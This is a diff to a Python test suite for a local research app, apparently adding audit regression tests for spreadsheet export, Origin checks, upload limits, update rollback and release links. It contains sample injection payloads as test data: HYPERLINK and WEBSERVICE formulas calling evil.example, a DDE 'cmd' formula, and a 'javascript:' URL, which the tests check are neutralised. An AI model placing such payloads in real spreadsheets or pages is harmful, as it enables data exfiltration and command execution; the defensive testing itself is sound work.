@@ -107,7 +107,7 @@ def test_foreign_origin_refused_even_with_token():
     assert r.status_code == 403
     r = client.post("/api/settings/check_updates", headers={"Origin": "null"})
     assert r.status_code == 403
-    r = client.get("/api/meta", headers={"Origin": "http://127.0.0.1:8765"})
+    r = client.get("/api/meta", headers={"Host": "127.0.0.1:8765", "Origin": "http://127.0.0.1:8765"})
     assert r.status_code == 200
 
 
@@ -891,3 +891,121 @@ def test_source_cited_by_completed_run_needs_force(mock_llm_ca):
     sid = client.get(f'/api/projects/{pid}').json()["sources"][0]["id"]
     assert client.delete(f'/api/sources/{sid}').status_code == 409
     assert client.delete(f'/api/sources/{sid}?force=true').status_code == 200
+
+
+# ====================================================================
+# 2026-09-03 audit: sheet cells, exact origin, upload bound, rollback, release link
+# ====================================================================
+
+def test_sheet_cells_are_text_never_formulas():
+    """openpyxl stores a string beginning with '=' as a formula; names,
+    definitions, and quotes come from the model and from the documents."""
+    from openpyxl import load_workbook
+    from app import checkpoint_sheets as cs
+    evil = '=HYPERLINK("http://evil.example/?x","open")'
+    payload = {"kind": "code_review", "stage": "open_code",
+               "items": [{"id": "c1", "name": evil, "definition": "=1+1", "excerpt_count": 1,
+                          "sample_excerpts": [{"quote": '=WEBSERVICE("http://evil.example")'}]}]}
+    meta = {"project_name": "=cmd|' /C calc'!A0", "run_id": "r", "checkpoint_id": "cp1",
+            "title": "t", "stage": "open_code", "exported_at": "now"}
+    data = cs.export_workbook("code_review", payload, meta,
+                              excerpts=[{"code_id": "c1", "code": evil, "via": "", "source": "s",
+                                         "quote": "=SUM(A1)", "memo": ""}])
+    wb = load_workbook(io.BytesIO(data))
+    for ws in wb.worksheets:
+        for row in ws.iter_rows():
+            for c in row:
+                assert c.data_type != "f", f"{ws.title}!{c.coordinate} became a formula: {c.value!r}"
+    assert wb["Codes"]["B2"].value == evil
+    # and it reads back as the same, unchanged, code
+    parsed = cs.parse_workbook("code_review", payload, data, "cp1")
+    assert parsed["summary"]["renamed"] == 0 and parsed["summary"]["unchanged"] == 1
+    # the extraction sheet takes the same path
+    payload2 = {"kind": "extraction_review", "fields": ["aims"], "field_labels": {"aims": "Aims"},
+                "rows": [{"source_id": "s1", "filename": "=f.pdf", "label": "=L", "citation": "",
+                          "fields": {"aims": "=A"}, "cited_work": ""}]}
+    wb2 = load_workbook(io.BytesIO(cs.export_workbook("extraction_review", payload2, meta,
+                                                       excerpts=[{"source_id": "s1", "paper": "=L", "field": "aims",
+                                                                  "quote": "=Q", "memo": ""}])))
+    assert all(c.data_type != "f" for ws in wb2.worksheets for row in ws.iter_rows() for c in row)
+
+
+def test_origin_must_be_the_apps_own_origin_exactly():
+    """Browsers ignore the port for cookies and for SameSite, so a page served
+    by another local program on another port arrives WITH the cookie; only
+    an Origin equal to this app's own (scheme, host, port) may pass."""
+    from app import main as main_mod
+    cookie_only = TestClient(app, base_url="http://127.0.0.1")
+    cookie_only.cookies.set(main_mod.TOKEN_COOKIE, SESSION_TOKEN)
+    host = {"Host": "127.0.0.1:8765"}
+    for origin in ("http://127.0.0.1:3000", "http://localhost:3000", "http://localhost:8765",
+                   "https://127.0.0.1:8765", "http://127.0.0.1", "null", "http://127.0.0.1:8765.evil.example"):
+        r = cookie_only.get("/api/meta", headers={**host, "Origin": origin})
+        assert r.status_code == 403, origin
+    assert cookie_only.get("/api/meta", headers={**host, "Origin": "http://127.0.0.1:8765"}).status_code == 200
+    assert cookie_only.get("/api/meta", headers={"Host": "localhost:8765", "Origin": "http://localhost:8765"}).status_code == 200
+    assert cookie_only.get("/api/meta", headers={"Host": "[::1]:8765", "Origin": "http://[::1]:8765"}).status_code == 200
+    assert cookie_only.get("/api/meta", headers={"Host": "127.0.0.1:8765", "Origin": "HTTP://127.0.0.1:8765"}).status_code == 200
+    # no Origin at all (a plain download link) is still gated by the token alone
+    assert cookie_only.get("/api/meta", headers=host).status_code == 200
+    assert TestClient(app, base_url="http://127.0.0.1").get("/api/meta", headers=host).status_code == 401
+
+
+def test_source_upload_is_bounded_and_streamed(monkeypatch):
+    from app import main as main_mod
+    monkeypatch.setitem(main_mod.MAX_SOURCE_BYTES, "text", 64)
+    r = client.post('/api/projects', json={"name": "Bound", "method": "thematic",
+                                           "config": {"provider": "anthropic", "research_question": "q"}})
+    pid = r.json()["id"]
+    r = client.post(f"/api/projects/{pid}/sources",
+                    files={"file": ("big.txt", io.BytesIO(b"x" * 1000), "text/plain")}, data={"grp": ""})
+    assert r.status_code == 413 and "larger than" in r.json()["detail"]
+    assert not list(db.UPLOADS_DIR.glob("*_big.txt")), "a refused upload must not linger on disk"
+    assert client.get(f"/api/projects/{pid}").json()["sources"] == []
+    r = client.post(f"/api/projects/{pid}/sources",
+                    files={"file": ("small.txt", io.BytesIO(b"short text"), "text/plain")}, data={"grp": ""})
+    assert r.status_code == 200 and r.json()["meta"]["bytes"] == 10
+    assert main_mod.MAX_SOURCE_BYTES["video"] > main_mod.MAX_SOURCE_BYTES["audio"] > main_mod.MAX_SOURCE_BYTES["text"]
+
+
+def test_update_refuses_an_older_build_unless_asked(tmp_path, monkeypatch):
+    from tests.test_fixes import _make_bundle, _fake_app_root, _quiesce_runs
+    root = _fake_app_root(tmp_path, monkeypatch)          # installed build 1111.01.01
+    older = _make_bundle(tmp_path, version="1000.01.01")
+    with pytest.raises(update.RollbackRefused, match="older than the installed build"):
+        update.apply_update(older)
+    assert (root / "VERSION").read_text() == "1111.01.01"
+    assert (root / "backend" / "app" / "main.py").read_text() == "# old main", "nothing may change before the refusal"
+    _quiesce_runs()
+    # the zip endpoint answers 409 …
+    with open(older, "rb") as f:
+        r = client.post('/api/settings/update', files={"file": ("QualiLens.zip", f, "application/zip")})
+    assert r.status_code == 409 and "older" in r.json()["detail"]
+    # … the GitHub path never installs an older build …
+    monkeypatch.setattr(update, "download_latest_bundle", lambda d: older)
+    assert client.post('/api/settings/install_update').status_code == 409
+    assert (root / "VERSION").read_text() == "1111.01.01"
+    # … and the zip path installs it only when told to
+    with open(older, "rb") as f:
+        r = client.post('/api/settings/update', files={"file": ("QualiLens.zip", f, "application/zip")},
+                        data={"allow_downgrade": "true"})
+    assert r.status_code == 200 and r.json()["to_version"] == "1000.01.01"
+    assert (root / "VERSION").read_text() == "1000.01.01"
+    # the same build again (a repair) and an unstamped build are not rollbacks
+    assert update.apply_update(_make_bundle(tmp_path, version="1000.01.01"))["ok"]
+    assert update.apply_update(_make_bundle(tmp_path, version="unknown"))["ok"]
+    assert update.is_older_build("2026.09.02-1845", "2026.09.03-0900")
+    assert not update.is_older_build("2026.09.03-0900", "2026.09.02-1845")
+    assert not update.is_older_build("dev", "2026.09.02-1845")
+
+
+def test_release_page_link_only_when_it_is_github(monkeypatch):
+    base = {"tag_name": "v9", "name": "v9 — build 9999.01.01-0000", "body": "", "assets": []}
+    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": "javascript:alert(1)"})
+    r = client.post('/api/settings/check_updates').json()
+    assert r["ok"] and r["newer"] is True and r["release_url"] == ""
+    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": "https://evil.example/qualilens"})
+    assert client.post('/api/settings/check_updates').json()["release_url"] == ""
+    good = f"https://github.com/{update.UPDATE_REPO}/releases/tag/v9"
+    monkeypatch.setattr(update, "fetch_latest_release", lambda: {**base, "html_url": good})
+    assert client.post('/api/settings/check_updates').json()["release_url"] == good
